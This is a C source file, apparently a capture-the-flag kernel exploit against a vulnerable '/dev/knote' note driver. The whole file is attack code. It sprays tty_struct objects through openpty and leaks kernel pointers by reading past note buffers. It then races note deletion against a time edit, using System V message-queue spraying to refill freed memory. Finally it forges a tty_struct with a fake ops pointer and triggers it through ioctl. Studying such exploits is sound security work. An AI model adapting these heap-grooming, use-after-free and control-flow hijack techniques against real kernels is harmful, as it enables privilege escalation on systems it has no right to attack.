#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pty.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include "exploit.h"

#define BEFORE_NUM 8000
#define AFTER_NUM 8000
#define REFILL_NUM 100
#define ALLOC_NUM 128
#define MSG_NUM 256
#define STRUCT_LEN (0x58 - 0x30)
unsigned long spray[BEFORE_NUM + AFTER_NUM];
unsigned long spray2[REFILL_NUM];
unsigned long vuln;
int fd;
struct 
{ 
	long mtype;
	char mtext[STRUCT_LEN];
} msg = {0x4141414141414141, {0}};
int msqid;

unsigned long add_note(int fd, unsigned long year, unsigned long month, unsigned long day,
		unsigned long h, unsigned long m, unsigned long s,
		void *buf, unsigned long size) {
	struct note_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.buf_size = size;
	io.buf = buf;

	ret = ioctl(fd, NOTE_ADD, &io);
	if (ret < 0) {
		printf("[-] add note failed\n");
		exit(1);
	}

	return *(unsigned long *)(&io);
}

int delete_note(int fd, unsigned long year, unsigned long month, unsigned long day, unsigned long h, unsigned long m, unsigned long s, unsigned long magic) {
	struct delete_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.magic = magic;

	ret = ioctl(fd, NOTE_DELETE, &io);
	if (ret < 0) {
		printf("[-] delete note failed\n");
		exit(1);
	}

	return ret;
}

int read_note(int fd, unsigned long year, unsigned long month, unsigned long day, unsigned long h, unsigned long m, unsigned long s, unsigned long magic, unsigned long size, void *buf) {
	struct read_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.magic = magic;
	io.buf_size = size;
	io.buf = buf;

	ret = ioctl(fd, NOTE_READ, &io);
	if (ret < 0) {
		printf("[-] read note failed\n");
	//	exit(1);
	}
	return ret;
}

int edit_time(int fd, unsigned long year, unsigned long month, unsigned long day, unsigned long h, unsigned long m, unsigned long s, unsigned long new_year, unsigned long new_month, unsigned long new_day, unsigned long new_h, unsigned long new_m, unsigned long new_s, unsigned long magic) {
	struct time_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.magic = magic;

	io.new_date.year = new_year;
	io.new_date.month = new_month;
	io.new_date.day = new_day;
	io.new_date.h = new_h;
	io.new_date.m = new_m;
	io.new_date.s = new_s;

	io.cmd = EDIT_TIME;

	ret = ioctl(fd, NOTE_EDIT, &io);
	if (ret < 0) {
		printf("[-] edit time failed\n");
		exit(1);
	}
	return ret;
}

int edit_buf(int fd, unsigned long year, unsigned long month, unsigned long day, unsigned long h, unsigned long m, unsigned long s, unsigned long magic, unsigned long size, void *buf) {
	struct buf_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.magic = magic;
	io.buf_size = size;
	io.buf = buf;

	io.cmd = EDIT_NOTE;

	ret = ioctl(fd, NOTE_EDIT, &io);
	if (ret < 0) {
		printf("[-] edit note failed\n");
		exit(1);
	}

	return ret;
}

int list(int fd) {
	int ret;

	ret = ioctl(fd, NOTE_LIST, 0);
	if (ret < 0) {
		printf("[-] list note failed\n");
		exit(1);
	}

	return ret;
}

void racing(void) {
	int i;
	unsigned long year = 2017, month = 1, day = 1;
	unsigned long h = 1, m = 1, s = 2;

	delete_note(fd, year, month, day, h, m, s, vuln);

	for (i = 0; i < MSG_NUM; i++) {
		if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
			puts("msgsnd");
            exit(1);
        }
    }

	while(1) {
		sleep(10);
	}
}

int main()
{
	int i, j, ret;
	int corrupted_i;
	int m_fd[ALLOC_NUM], s_fd[ALLOC_NUM];

	pthread_t pt;

	unsigned long year, month, day;
	unsigned long h, m, s, new_s;
	char buf[BUFFER_SIZE];
	unsigned long size;
	unsigned long link = 0, controlled = 0, ops;

	struct tty_struct_header refill;
	char scratch[1024];

	puts("[+] let's start :)");

	puts("[+] open device");
	fd = open("/dev/knote", O_RDWR);
	if (fd < 0) {
		puts("[-] device open failed");
		exit(1);
	}

	/* tty spraying */
	puts("[+] spraying tty_struct");
	for (i = 0; i < ALLOC_NUM; ++i) {
		if (openpty(&m_fd[i], &s_fd[i], NULL, NULL, NULL) == -1) {
			puts("[-] pty creation failed");
			exit(1);
		}
	}

	for (i = 0; i < ALLOC_NUM; i += 2) {
		close(m_fd[i]);
		close(s_fd[i]);
	}

	puts("[+] spraying notes on the same day");
	year = 2017; month = 1; day = 1;
	h = 1; m = 1, s = 1;
	size = 0;
	for (i = 0; i < BEFORE_NUM; i++) {
		spray[i] = add_note(fd, year, month, day, h, m, s, &buf, size);			
	}

	/* tty offset: ops 0x00000018, link 0x00000218, name 0x00000190 */ 
	for (i = 0; i < BEFORE_NUM; i++) {
		read_note(fd, year, month, day, h, m, s, spray[i], BUFFER_SIZE, &buf);
		if (*(char *)(buf + 0x190) == 'p'
		&& *(char *)(buf + 0x191) == 't'
		&& *(char *)(buf + 0x192) == 's') {
			link = *(unsigned long *)(buf + 0x218);
			ops = *(unsigned long *)(buf + 0x18);
			printf("[+] i: %d leaked link addr: 0x%08lx leaked pc: 0x%08lx\n", i, link, ops);
			break;
		}
	}
	
	if (!link) {
		puts("[-] leaking failed");
		exit(1);
	}

	read_note(fd, year, month, day, h, m, s, spray[i + 1], BUFFER_SIZE, &buf);
	if (*(char *)(buf + 0x190) != 'p'
	|| *(char *)(buf + 0x191) != 't'
	|| *(char *)(buf + 0x192) != 'm') 
		puts("[-] fengshui failed");
	controlled = *(unsigned long *)(buf + 0x218);
	printf("[+] controlled addr: 0x%08lx\n", controlled);

	getchar();

	year = 2017; month = 1; day = 1;
	h = 1; m = 1, s = 2;
	size = 0;
	vuln = add_note(fd, year, month, day, h, m, s, &buf, size);
	printf("vuln magic: 0x%08lx\n", vuln);

	s = 1;
	for (i = 0; i < AFTER_NUM; i++) {
		spray[i + BEFORE_NUM] = add_note(fd, year, month, day, h, m, s, &buf, size);
	}

	puts("[+] preparing msg for re-filling");
	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
		puts("[-] msgget error");
        exit(1);
	}		

	*(unsigned long *)(&msg.mtext[(0x38 - 0x30)]) = vuln;
	*(unsigned long *)(&msg.mtext[(0x40 - 0x30)]) = link;
	*(unsigned long *)(&msg.mtext[(0x48 - 0x30)]) = 0x0; // next
	*(unsigned long *)(&msg.mtext[(0x50 - 0x30)]) = 0x0; // pprev

	pthread_create(&pt, NULL, (void *)racing, NULL);

	s = 2;
	new_s = 1;
	edit_time(fd, year, month, day, h, m, s, year, month, day, h, m, new_s, vuln);

	puts("[+] racing ends");

	delete_note(fd, year, month, day, h, m, new_s, vuln);

	s = 1;
	for (i = 0; i < BEFORE_NUM; i++) {
		ret = read_note(fd, year, month, day, h, m, s, spray[i], 0x0, &buf);
		if (ret < 0) {
			printf("[+] corrupted note i: %d\n", i);
			break;
		}
	}
	corrupted_i = i;

	for (i = 0; i < ALLOC_NUM; i += 2) {
		if (openpty(&m_fd[i], &s_fd[i], NULL, NULL, NULL) == -1) {
			puts("[-] pty creation failed");
			exit(1);
		}
	}
	
	delete_note(fd, year, month, day, h, m, s, spray[corrupted_i]);

	refill.magic = TTY_MAGIC;
	refill.kref.refcount.counter = 0x1337;
	refill.dev = scratch;
	refill.driver = scratch;
	refill.ops = (void *)(0x4141414142424242);
	s = 3; size = sizeof(struct tty_struct_header); 
	for (i = 0; i < REFILL_NUM; i++) {
		spray2[i] = add_note(fd, year, month, day, h, m, s, &refill, size);
	}

	for (i = 0; i < ALLOC_NUM; i += 2) {
		ioctl(m_fd[i], 0xdeadbeef);
		ioctl(s_fd[i], 0xdeadbeef);
	}

	printf("[+] end");
	getchar();
	return 0;
}


